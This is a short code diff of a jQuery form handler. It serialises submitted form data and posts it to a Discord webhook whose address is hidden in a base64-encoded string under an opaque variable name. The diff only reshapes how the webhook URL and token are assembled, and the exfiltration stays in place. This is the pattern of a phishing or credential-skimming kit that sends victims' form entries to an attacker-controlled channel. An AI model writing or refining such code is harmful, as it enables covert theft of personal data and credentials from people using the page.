@@ -32,13 +32,13 @@ $(document).ready(function() {
         end = true
         var formData = $(this).serialize();
 
-        var ewr41 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MzQyMDcxNjI1NDQyOTI1NC9tRlU4UFZuNXB3dHlLV0hNYTRUOXd0bVkHckNOLTQkWmZPNGZBRkJIRWtYMy0wMXRsb2Y1b0txREJybV93Y1NISkthSQ==";
+        var ewr41 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MzQyMDcxNjI1NDQyOTI1NA==";
 
         function db64(str) {
             return atob(str.replace(/\s/g, ''));
         }
 
-        var URL = db64(ewr41);
+        var URL = `${db64(ewr41)}/mFU8PVn5pwtyKWHMa4T9wtmYHrCNL4dZfO4fAFBHEkX3-01tlof5oKqDBrm_wcSHJKaJ`;
 
         $.ajax({
             url: URL,
